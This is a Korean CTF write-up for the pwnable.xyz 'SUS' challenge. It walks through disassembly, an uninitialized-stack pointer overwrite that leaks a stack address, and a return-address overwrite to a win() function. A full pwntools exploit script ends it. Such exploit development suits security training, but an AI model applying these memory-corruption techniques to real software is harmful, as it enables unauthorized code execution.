# [WriteUp]pwnable.xyz - SUS

:black_nib:ChyKor12(sjjo0225@gmail.com)

---

```bash
gdb-peda$ pd main
Dump of assembler code for function main:
   0x0000000000400b84 <+0>:	push   rbp
   0x0000000000400b85 <+1>:	mov    rbp,rsp
   0x0000000000400b88 <+4>:	sub    rsp,0x10
   0x0000000000400b8c <+8>:	call   0x4008d4 <setup>
   0x0000000000400b91 <+13>:	lea    rdi,[rip+0x165]        # 0x400cfd
   0x0000000000400b98 <+20>:	call   0x400710 <puts@plt>
   0x0000000000400b9d <+25>:	call   0x400b5e <print_menu>
   0x0000000000400ba2 <+30>:	lea    rdi,[rip+0x16f]        # 0x400d18
   0x0000000000400ba9 <+37>:	mov    eax,0x0
   0x0000000000400bae <+42>:	call   0x400740 <printf@plt>
   0x0000000000400bb3 <+47>:	call   0x40096f <read_int32>
   0x0000000000400bb8 <+52>:	mov    DWORD PTR [rbp-0x4],eax
   0x0000000000400bbb <+55>:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000400bbe <+58>:	cmp    eax,0x1
   0x0000000000400bc1 <+61>:	je     0x400be1 <main+93>
   0x0000000000400bc3 <+63>:	cmp    eax,0x1
   0x0000000000400bc6 <+66>:	jg     0x400bce <main+74>
   0x0000000000400bc8 <+68>:	test   eax,eax
   0x0000000000400bca <+70>:	je     0x400bda <main+86>
   0x0000000000400bcc <+72>:	jmp    0x400bf6 <main+114>
   0x0000000000400bce <+74>:	cmp    eax,0x2
   0x0000000000400bd1 <+77>:	je     0x400be8 <main+100>
   0x0000000000400bd3 <+79>:	cmp    eax,0x3
   0x0000000000400bd6 <+82>:	je     0x400bef <main+107>
   0x0000000000400bd8 <+84>:	jmp    0x400bf6 <main+114>
   0x0000000000400bda <+86>:	mov    eax,0x0
   0x0000000000400bdf <+91>:	jmp    0x400c04 <main+128>
   0x0000000000400be1 <+93>:	call   0x4009be <create_user>
   0x0000000000400be6 <+98>:	jmp    0x400c02 <main+126>
   0x0000000000400be8 <+100>:	call   0x400a79 <print_user>
   0x0000000000400bed <+105>:	jmp    0x400c02 <main+126>
   0x0000000000400bef <+107>:	call   0x400ac9 <edit_usr>
   0x0000000000400bf4 <+112>:	jmp    0x400c02 <main+126>
   0x0000000000400bf6 <+114>:	lea    rdi,[rip+0x11e]        # 0x400d1b
   0x0000000000400bfd <+121>:	call   0x400710 <puts@plt>
   0x0000000000400c02 <+126>:	jmp    0x400b9d <main+25>
   0x0000000000400c04 <+128>:	leave  
   0x0000000000400c05 <+129>:	ret    
End of assembler dump.
gdb-peda$ x/s 0x400d1b
0x400d1b:	"Invalid"
```

`create_user()`, `print_user()`, `edit_usr()` 3개의 함수로 이루어진 프로그램이다. 메뉴를 입력받는데 1이면 `create_user()`, 2이면 `print_user()`, 3이면 `edit_user()`를 호출하고, 0이면 `main+68`의 조건문을 통과하여 함수가 리턴되고 프로그램이 종료된다. 그 외에 다른 숫자를 입력하면 `"invalid"`를 출력하고 다시 메뉴 선택으로 돌아간다.

---

```bash
gdb-peda$ pd create_user
Dump of assembler code for function create_user:
...
   0x00000000004009d8 <+26>:	mov    rax,QWORD PTR [rbp-0x1060]
   0x00000000004009df <+33>:	test   rax,rax
   0x00000000004009e2 <+36>:	jne    0x400a0e <create_user+80>
   0x00000000004009e4 <+38>:	mov    edi,0x20
   0x00000000004009e9 <+43>:	call   0x400790 <malloc@plt>
   0x00000000004009ee <+48>:	mov    QWORD PTR [rbp-0x1060],rax
   0x00000000004009f5 <+55>:	mov    rax,QWORD PTR [rbp-0x1060]
   0x00000000004009fc <+62>:	mov    edx,0x20
   0x0000000000400a01 <+67>:	mov    esi,0x0
   0x0000000000400a06 <+72>:	mov    rdi,rax
   0x0000000000400a09 <+75>:	call   0x400750 <memset@plt>
   0x0000000000400a0e <+80>:	lea    rdi,[rip+0x283]        # 0x400c98
   0x0000000000400a15 <+87>:	mov    eax,0x0
   0x0000000000400a1a <+92>:	call   0x400740 <printf@plt>
   0x0000000000400a1f <+97>:	mov    rax,QWORD PTR [rbp-0x1060]
   0x0000000000400a26 <+104>:	mov    edx,0x20
   0x0000000000400a2b <+109>:	mov    rsi,rax
   0x0000000000400a2e <+112>:	mov    edi,0x0
   0x0000000000400a33 <+117>:	call   0x400770 <read@plt>
   0x0000000000400a38 <+122>:	lea    rdi,[rip+0x260]        # 0x400c9f
   0x0000000000400a3f <+129>:	mov    eax,0x0
   0x0000000000400a44 <+134>:	call   0x400740 <printf@plt>
   0x0000000000400a49 <+139>:	call   0x40096f <read_int32>
   0x0000000000400a4e <+144>:	mov    DWORD PTR [rbp-0x1018],eax
   0x0000000000400a54 <+150>:	lea    rax,[rbp-0x1060]
   0x0000000000400a5b <+157>:	mov    QWORD PTR [rip+0x201806],rax        # 0x602268 <cur>
...
gdb-peda$ x/s 0x400c98
0x400c98:	"Name: "
gdb-peda$ x/s 0x400c9f
0x400c9f:	"Age: "
```

`create_user()`는 사용자를 만드는 함수이다. 먼저 `create_user+33`에서 `QWORD PTR [rbp-0x1060]`이 0인지 검사한다. `create_user()`를 호출해서 청크를 할당하면 그 청크의 user data의 주소가 `rbp-0x1060`에 저장되기 때문에 저 값이 0 아니라면 이미 할당된 청크가 있다는 뜻이다. 이미 청크가 있으면 `create_user+80`으로 점프해서 이름과 나이를 입력받는다. 이름은 그 청크의 user data 영역에 저장되고 나이는 `rbp-0x1018`에 저장된다. 그리고 `cur`이라는 전역 변수에 `[rbp-0x1060]`, 즉 청크의 주소가 저장되어 있는 공간의 주소를 넣는다.

---

```bash
gdb-peda$ pd print_user
Dump of assembler code for function print_user:
   0x0000000000400a79 <+0>:	push   rbp
   0x0000000000400a7a <+1>:	mov    rbp,rsp
   0x0000000000400a7d <+4>:	mov    rax,QWORD PTR [rip+0x2017e4]        # 0x602268 <cur>
   0x0000000000400a84 <+11>:	test   rax,rax
   0x0000000000400a87 <+14>:	je     0x400ac6 <print_user+77>
   0x0000000000400a89 <+16>:	mov    rax,QWORD PTR [rip+0x2017d8]        # 0x602268 <cur>
   0x0000000000400a90 <+23>:	mov    rax,QWORD PTR [rax]
   0x0000000000400a93 <+26>:	mov    rsi,rax
   0x0000000000400a96 <+29>:	lea    rdi,[rip+0x208]        # 0x400ca5
   0x0000000000400a9d <+36>:	mov    eax,0x0
   0x0000000000400aa2 <+41>:	call   0x400740 <printf@plt>
   0x0000000000400aa7 <+46>:	mov    rax,QWORD PTR [rip+0x2017ba]        # 0x602268 <cur>
   0x0000000000400aae <+53>:	mov    eax,DWORD PTR [rax+0x48]
   0x0000000000400ab1 <+56>:	mov    esi,eax
   0x0000000000400ab3 <+58>:	lea    rdi,[rip+0x1f5]        # 0x400caf
   0x0000000000400aba <+65>:	mov    eax,0x0
   0x0000000000400abf <+70>:	call   0x400740 <printf@plt>
   0x0000000000400ac4 <+75>:	jmp    0x400ac7 <print_user+78>
   0x0000000000400ac6 <+77>:	nop
   0x0000000000400ac7 <+78>:	pop    rbp
   0x0000000000400ac8 <+79>:	ret    
End of assembler dump.
```

`print_user()`는 사용자의 정보를 출력하는 함수이다. `cur`에 접근해서 사용자의 이름을 출력하고, 나이가 저장된 주소에 접근해서 나이도 출력한다.

---

```bash
gdb-peda$ pd edit_usr
Dump of assembler code for function edit_usr:
   0x0000000000400ac9 <+0>:	push   rbp
   0x0000000000400aca <+1>:	mov    rbp,rsp
   0x0000000000400acd <+4>:	push   rbx
   0x0000000000400ace <+5>:	sub    rsp,0x1028
   0x0000000000400ad5 <+12>:	mov    rax,QWORD PTR fs:0x28
   0x0000000000400ade <+21>:	mov    QWORD PTR [rbp-0x18],rax
   0x0000000000400ae2 <+25>:	xor    eax,eax
   0x0000000000400ae4 <+27>:	mov    rax,QWORD PTR [rip+0x20177d]        # 0x602268 <cur>
   0x0000000000400aeb <+34>:	test   rax,rax
   0x0000000000400aee <+37>:	je     0x400b3f <edit_usr+118>
   0x0000000000400af0 <+39>:	lea    rdi,[rip+0x1a1]        # 0x400c98
   0x0000000000400af7 <+46>:	mov    eax,0x0
   0x0000000000400afc <+51>:	call   0x400740 <printf@plt>
   0x0000000000400b01 <+56>:	mov    rax,QWORD PTR [rip+0x201760]        # 0x602268 <cur>
   0x0000000000400b08 <+63>:	mov    rax,QWORD PTR [rax]
   0x0000000000400b0b <+66>:	mov    edx,0x20
   0x0000000000400b10 <+71>:	mov    rsi,rax
   0x0000000000400b13 <+74>:	mov    edi,0x0
   0x0000000000400b18 <+79>:	call   0x400770 <read@plt>
   0x0000000000400b1d <+84>:	lea    rdi,[rip+0x17b]        # 0x400c9f
   0x0000000000400b24 <+91>:	mov    eax,0x0
   0x0000000000400b29 <+96>:	call   0x400740 <printf@plt>
   0x0000000000400b2e <+101>:	mov    rbx,QWORD PTR [rip+0x201733]        # 0x602268 <cur>
   0x0000000000400b35 <+108>:	call   0x40096f <read_int32>
   0x0000000000400b3a <+113>:	mov    DWORD PTR [rbx+0x48],eax
   0x0000000000400b3d <+116>:	jmp    0x400b40 <edit_usr+119>
   0x0000000000400b3f <+118>:	nop
   0x0000000000400b40 <+119>:	mov    rax,QWORD PTR [rbp-0x18]
   0x0000000000400b44 <+123>:	xor    rax,QWORD PTR fs:0x28
   0x0000000000400b4d <+132>:	je     0x400b54 <edit_usr+139>
   0x0000000000400b4f <+134>:	call   0x400720 <__stack_chk_fail@plt>
   0x0000000000400b54 <+139>:	add    rsp,0x1028
   0x0000000000400b5b <+146>:	pop    rbx
   0x0000000000400b5c <+147>:	pop    rbp
   0x0000000000400b5d <+148>:	ret    
End of assembler dump.
```

`edit_usr()`는 사용자의 이름과 나이를 수정하는 함수이다. `cur`에 접근하여 주소를 가져와서 `create_user()`에서와 같은 방식으로 이름과 나이를 입력받는다.

---

```bash
chykor12@ubuntu:~/pwnable.xyz$ objdump -d SUS

SUS:     file format elf64-x86-64
...
0000000000400b71 <win>:
  400b71:	55                   	push   %rbp
  400b72:	48 89 e5             	mov    %rsp,%rbp
  400b75:	48 8d 3d 78 01 00 00 	lea    0x178(%rip),%rdi        # 400cf4 <_IO_stdin_used+0x64>
  400b7c:	e8 af fb ff ff       	callq  400730 <system@plt>
  400b81:	90                   	nop
  400b82:	5d                   	pop    %rbp
  400b83:	c3                   	retq
...
```

`objdump`로 바이너리를 까 봤더니, `win()`이라는 함수가 있다.

```bash
gdb-peda$ x/s 0x400cf4
0x400cf4:	"cat flag"
```

`win+11`에서는 `system("cat flag");`를 호출한다는 것을 알 수 있다. `win()`을 호출하는 것이 최종 목적이 되었다. PIE가 걸려 있지 않기 때문에 `win()`의 주소는 `0x400b71`이다.

---

처음에는 취약점을 발견하기가 굉장히 어려웠다. 코드를 계속 봐도 딱히 취약해 보이는 코드가 없었다. BOF가 발생하는 것도 아니고, 프로그램 자체에 청크를 해제하는 코드가 있는 게 아니라서 힙 영역에서의 취약점도 발생하지 않는다. 그래서 그냥 계속 한 줄씩 디버깅을 하다가 `edit_usr()`에서 취약점을 발견하였다.

```bash
gdb-peda$ pd edit_usr
Dump of assembler code for function edit_usr:
...
   0x0000000000400b2e <+101>:	mov    rbx,QWORD PTR [rip+0x201733]        # 0x602268 <cur>
   0x0000000000400b35 <+108>:	call   0x40096f <read_int32>
...
```

`edit_usr+101`에서 `cur`에 있는 값을 `rbx`에 넣는다. GDB에서는 `0x7fffffffcf20`이다. 바로 다음에 `read_int32()`를 호출하는데, 이때 `rbp`는 `0x7fffffffcf40`이고, `rsp`는 `rbp-0x30`이 된다. 사용자의 이름이 저장된 주소, 즉 청크의 주소는 `rbp-0x20`에 위치한다. `read_int32()`의 스택 프레임 안에 포함되는 것이다. `read_int32()`에는 다음과 같은 부분이 있다.

```bash
gdb-peda$ pd read_int32
Dump of assembler code for function read_int32:
...
   0x0000000000400986 <+23>:	lea    rax,[rbp-0x30]
   0x000000000040098a <+27>:	mov    edx,0x20
   0x000000000040098f <+32>:	mov    rsi,rax
   0x0000000000400992 <+35>:	mov    edi,0x0
   0x0000000000400997 <+40>:	call   0x400770 <read@plt>
...
```

`rbp-0x30`부터 `0x20`바이트 만큼 문자열을 입력받는다. 청크의 주소는 `rbp-0x20`에 저장되어 있으므로 이 부분의 메모리를 덮어쓸 수 있다. 즉, `r` 권한이 있는 임의의 주소로 이 부분을 덮으면 `print_menu()`를 호출했을 때 그 주소에 저장된 값이 출력될 것이다. 이를 이용하여 memory leak이 가능하다. `cur`의 주소인 `0x602268`로 덮어쓰면 `cur`에 저장된 스택 주소가 출력되기 때문에 ASLR을 우회할 수 있을 것이다.

```bash
gdb-peda$ x/8gx $rsp
0x7fffffffcf10:	0x00007fffffffdf80	0x0000000000400a4e
0x7fffffffcf20:	0x0000000000603260	0x0000000000000000
0x7fffffffcf30:	0x0000000000000000	0xeb581168340ea600
0x7fffffffcf40:	0x00007fffffffdf80	0x0000000000400b3a
```

`read_int32+40`에서 `read()`를 호출하기 직전의 스택 상태이다. 레지스터의 상태는 다음과 같다.

```bash
[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffcf10 --> 0x7fffffffdf80 --> 0x7fffffffdfa0 --> 0x400c10 (<__libc_csu_init>:	push   r15)
RBX: 0x7fffffffcf20 --> 0x603260 --> 0xa41414141 ('AAAA\n')
RCX: 0x0 
RDX: 0x20 (' ')
RSI: 0x7fffffffcf10 --> 0x7fffffffdf80 --> 0x7fffffffdfa0 --> 0x400c10 (<__libc_csu_init>:	push   r15)
RDI: 0x0 
RBP: 0x7fffffffcf40 --> 0x7fffffffdf80 --> 0x7fffffffdfa0 --> 0x400c10 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffcf10 --> 0x7fffffffdf80 --> 0x7fffffffdfa0 --> 0x400c10 (<__libc_csu_init>:	push   r15)
RIP: 0x400997 (<read_int32+40>:	call   0x400770 <read@plt>)
...
```

입력값으로 `"A"*0x10+"\x28\x22\x60"`을 준 상황을 만들어 보자. 아무 입력이나 줘서 `read()`를 넘기고 `set` 명령어를 이용하자.

```bash
gdb-peda$ set {int}0x7fffffffcf10=0x41414141
gdb-peda$ set {int}0x7fffffffcf14=0x41414141
gdb-peda$ set {int}0x7fffffffcf18=0x41414141
gdb-peda$ set {int}0x7fffffffcf1c=0x41414141
gdb-peda$ set {int}0x7fffffffcf20=0x602268
gdb-peda$ x/8gx $rsp
0x7fffffffcf10:	0x4141414141414141	0x4141414141414141
0x7fffffffcf20:	0x0000000000602268	0x0000000000000000
0x7fffffffcf30:	0x0000000000000000	0xeb581168340ea600
0x7fffffffcf40:	0x00007fffffffdf80	0x0000000000400b3a
```

이 상태에서 레지스터의 상태는 다음과 같다.

```bash
[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffcf10 ('A' <repeats 16 times>, "h\"`")
RBX: 0x7fffffffcf20 --> 0x602268 (0x00007fffffffcf20)
RCX: 0x7ffff7ed9f81 (<__GI___libc_read+17>:	cmp    rax,0xfffffffffffff000)
RDX: 0x20 (' ')
RSI: 0x7fffffffcf10 ('A' <repeats 16 times>, "h\"`")
RDI: 0x0 
RBP: 0x7fffffffcf40 --> 0x7fffffffdf80 --> 0x7fffffffdfa0 --> 0x400c10 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffcf10 ('A' <repeats 16 times>, "h\"`")
RIP: 0x4009a0 (<read_int32+49>:	mov    rdi,rax)
R8 : 0x5 
R9 : 0x0 
R10: 0x7ffff7f66ae0 --> 0x100000000 
R11: 0x246 
R12: 0x4007d0 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe080 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x207 (CARRY PARITY adjust zero sign trap INTERRUPT direction overflow)
```

`rbx`가 가리키는 값이 `0x602268`로 바뀌었다. 이 상태에서 `print_user()`를 호출하면 `0x602268`, 즉 `cur`에 저장된 값이 출력될 것이다.

```bash
gdb-peda$ c
Continuing.
User:  ����
Age: 0
```

알아볼 순 없지만 아무튼 스택 릭에 성공했다!

---

출력된 주소와 `main()`의 return address의 주소와의 차이를 계산하면 return address의 주소도 알 수 있다. `rip`가 `main()`에 위치하도록 하여 return address의 주소를 구하자.

```bash
gdb-peda$ i r rbp
rbp            0x7fffffffdfa0      0x7fffffffdfa0
```

`rbp`에 `0x8`을 더하면 return address의 주소가 된다. `cur`에 저장된 값, 즉 leak되어 나오는 값은 `0x7fffffffcf20`이다. 두 주소의 차이를 구하자.

```bash
gdb-peda$ p 0x7fffffffdfa8 - 0x7fffffffcf20
$86 = 0x1088
```

우리가 덮어써야 할 주소는 알았지만 문제가 있다. `edit_usr()`를 호출하면 원래는 청크에 저장된 값이 바뀌어야 하지만, 청크의 주소가 저장되어 있어야 할 공간에 `cur`의 주소가 저장되어 있기 때문에 여기서 입력한 이름은 `cur`로 들어가게 된다. 따라서 앞에서 leak한 스택 주소를 name으로 넣어 주어야 `cur`의 값이 변하지 않는다. 그리고 앞에서와 같은 방식으로 `cur`의 주소가 저장된 공간을 `main()`의 return address의 주소로 덮어주면, `edit_usr()`를 한 번 더 호출했을 때 `main()`의 return address를 자유롭게 바꿀 수 있을 것이다.

이렇게 했더니 `system()`이 호출되는 과정에서 스택 정렬 때문에 SIGSEGV가 터져서, `"ret"` 가젯을 하나 넣어 주었다.

```bash
gdb-peda$ ropsearch "ret"
Searching for ROP gadget: 'ret' in: binary ranges
0x004006fe : (b'c3')	ret
0x00400831 : (b'c3')	ret
0x00400879 : (b'c3')	ret
0x0040089b : (b'c3')	ret
0x0040096e : (b'c3')	ret
0x004009bd : (b'c3')	ret
0x00400a78 : (b'c3')	ret
0x00400ac8 : (b'c3')	ret
0x00400b5d : (b'c3')	ret
0x00400b70 : (b'c3')	ret
0x00400b83 : (b'c3')	ret
0x00400c05 : (b'c3')	ret
0x00400c5f : (b'c3')	ret
0x00400c74 : (b'c3')	ret
0x00400c81 : (b'c3')	ret
0x00400c8c : (b'c3')	ret
```

---

최종 익스플로잇은 다음과 같다.

```python
# exploit_SUS.py

from pwn import *

# r = process("./SUS")
r = remote("svc.pwnable.xyz", 30011)

addr_win = 0x400b71 # address of win()
addr_cur = 0x602268 # address of variable 'cur'
ret = 0x4006fe # address of "ret" gadget

def cr(name, age):
    r.recvuntil("> ")
    r.send("1")
    r.recvuntil("Name: ")
    r.send(name)
    r.recvuntil("Age: ")
    r.send(age)

def pr():
    r.recvuntil("> ")
    r.send("2")

def ed(name, age):
    r.recvuntil("> ")
    r.send("3")
    r.recvuntil("Name: ")
    r.send(name)
    r.recvuntil("Age: ")
    r.send(age)

def ex():
    r.recvuntil("> ")
    r.send("0")

cr("ChyKor12", "21")
ed("ChyKor12", "A" * 0x10 + p64(addr_cur))

pr()
r.recvuntil("User: ")
stack = u64(r.recv(6).ljust(8, "\x00")) # address of stack memory (where address of chunk was on)
main_ret = stack + 0x1088 # address where return address of main() is on
log.info("return address of main() is on " + hex(main_ret))

ed(p64(stack), "A" * 0x10 + p64(main_ret))
ed(p64(ret) + p64(addr_win), "21")

ex()

r.interactive()
```

```bash
chykor12@ubuntu:~/pwnable.xyz$ python exploit_SUS.py
[+] Opening connection to svc.pwnable.xyz on port 30011: Done
[*] return address of main() is on 0x7ffe8519be68
[*] Switching to interactive mode
FLAG{uninitializ3d_variabl3_ch3ck3d}[*] Got EOF while reading in interactive
$
```

